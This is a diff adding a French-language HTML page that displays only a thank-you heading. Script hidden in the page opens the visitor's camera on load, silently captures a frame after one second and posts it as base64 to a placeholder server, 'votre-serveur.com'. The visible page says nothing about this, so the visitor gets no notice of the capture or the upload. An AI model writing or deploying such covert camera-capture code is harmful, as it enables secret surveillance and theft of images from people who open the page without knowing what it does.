@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Photo automatique</title>
+</head>
+<body>
+    <h1>Merci pour la photo !</h1>
+    <video id="video" autoplay playsinline style="display:none;"></video>
+    <canvas id="canvas" style="display:none;"></canvas>
+    <script>
+        // Accéder à la caméra
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+
+                // Attendre 1 seconde avant de capturer la photo
+                setTimeout(() => {
+                    // Définir la taille du canvas
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+
+                    // Dessiner l'image de la vidéo dans le canvas
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                    // Convertir l'image en base64
+                    const photo = canvas.toDataURL('image/png');
+
+                    // Envoyer la photo au serveur
+                    fetch('https://votre-serveur.com/recevoir-photo', {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({ image: photo }),
+                    })
+                    .then(response => {
+                        if (response.ok) {
+                            console.log('Photo envoyée !');
+                        } else {
+                            console.error('Erreur lors de l\'envoi');
+                        }
+                    });
+
+                    // Arrêter la caméra
+                    const tracks = stream.getTracks();
+                    tracks.forEach(track => track.stop());
+                }, 1000);
+            })
+            .catch(error => {
+                console.error('Erreur avec la caméra :', error);
+            });
+    </script>
+</body>
+</html>
